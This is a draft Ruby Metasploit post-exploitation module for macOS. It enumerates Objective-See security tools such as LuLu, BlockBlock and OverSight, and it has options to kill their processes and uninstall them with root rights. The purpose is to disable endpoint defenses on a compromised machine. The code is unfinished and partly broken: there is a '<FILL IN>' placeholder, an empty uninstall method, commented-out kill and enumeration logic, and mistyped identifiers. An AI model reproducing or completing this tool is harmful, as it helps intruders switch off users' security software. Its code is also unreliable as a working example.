##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::OSX
  include Msf::Post::Process
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Objective See Killer' => 'OSX Manage Module: Enumerate and disable Objective See products',
        'Description' => %q{
          This module enumerates the system for the presence of Objective See products such as LuLu, BlockBlock, Do Not Disturb,
          Rei Key, Ransom Where and Over Sight. If the disable option is set each product will be sent a kill
          signal to the pid associated with the application. Removing the product entirely from the system is
          also an option, removal occurs by <FILL IN>. Killing
          the pid and removing the product both require sudo privlleges.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'gardnerapp' ],
        'Platform' => [ 'osx' ],
        'URL' => [
          'https://objective-see.org/tools.html'
        ],
      )

  )
    register_options(
      [
        OptBool.new('KILL_PROCESSES', [true, 'When enabled all PID\'s associated with the installed Objective See products will be sent a kill signal. ', false]),
        OptBool.new('UNINSTALL', [true, 'When enabled all of the Objective See products weill be uninstalled from the system.'])
      ]
    )
  end

  # Holds information on an objective see product. i.e name, installation status and location on filesystem.
  class ObjectiveSee < Msf::Modules::Post__Osx__Manage__Objective_see_killer

    attr_accessor :name
    attr_accessor :path

    cattr_accessor :installed_products
    cattr_accessor :pids

    @@installed_products = []

    def initialize(name)
      @name = name
      @path = "/Applications/#{name}"
      @installed = installed?

      # @@present is a class variable which stores all of products installed on the system
      # ObjectiveSee.installed_products => [<ObjectiveSee>,<ObjectiveSee>]
      @@installed_products << self if installed?
    end

    # Arrays of products present on system & pid's of running processes
    %w[installed_products all_pids].each { |var| eval("@@#{var} = []", binding, __FILE__, __LINE__) }

    def installed?
      @installed = directory?(@path)
    end

    def pid
      # may return more than one pid need to test
      @pid = pidof @name
      print_status "DEBUG @pid = #{@pid.inspect} for @name = #{@name}"
    end

    def running?
      true unless @pid.nil?
    end
  end

  # determine which products are installed and their ppid if any
  def enumerate
    #products = ['LuLu.app', 'BlockBlock Helper.app', 'Do Not Disturb.app',
    # 'ReiKey.app', 'RansomWhere.app', 'OverSight.app'].map do |prod|
    #  ObjectiveSee.new prod
   # end

   ObjectiveSee.new 'LuLu.app'

    # we only want the products installed on the system
   # products = products.filter_map(&:installed?)
   # products.each { |prod| print_status "#{prod.name} is installed." }

    # determine which products are running.
   # products.filter_map(&:running?)
  end

  def kill_pid(pid)
    if !is_root?
      fail_with(Failure::NoAcces, 'Can not disable products unless running as root. 
      Please escelate privlleges before re-running the module.')
    end 
 
    kill_process pid 
  end

  def uninstall; end

  def run
    print_status('Enumerating Objective See security products.')
    enumerate

    if ObjectiveSee.installed_products.empty?
      fail_with(Failure::NotFound,
       "No Objective Cee products were found to be installed on the system.")
    else
      print_good("The following Objective See products were found installed on the system.")
      ObjectiveSee.installed_products.each {|prod| print_status(prod.name)}
    end 

   # ObjectiveSee.installed_products.each {|prod| &:kill_pid} if datastore['KILL_PROCESSES']

    # uninstall if datastore['']
  end
end
